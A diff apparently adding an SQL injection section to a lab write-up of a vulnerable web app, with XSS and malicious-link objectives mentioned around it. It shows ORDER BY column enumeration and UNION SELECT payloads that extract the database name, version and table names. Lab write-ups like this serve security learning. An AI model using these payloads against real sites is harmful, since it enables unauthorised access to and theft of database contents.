@@ -66,6 +66,21 @@ Description: A link to malicious form is provided through the feedback box in th
 
 ## Bonus 
 
+Objective #1: SQLI
+
+Description: Adding order by in the url displays content without any issues. This process is repeated until the value is equals 5 after which the page throws an error.
+
+       ' OR 1 ORDER BY 5-- -
+       
+Next, we can find the database name, database version, table name respectively and much more.
+
+    ' UNION SELECT 1,null,null,null,database() FROM information_schema.tables;-- -
+    ' UNION SELECT 1,null,null,null,version() FROM information_schema.tables;-- -
+    ' UNION SELECT 1,null,null,null,table_name FROM information_schema.tables WHERE table_schema=database();-- -
+
+<img src="blue-vulnBonus.gif">
+
+
 Objective #2: XSS
 
 Description: All XSS scripts are injected through contact form.
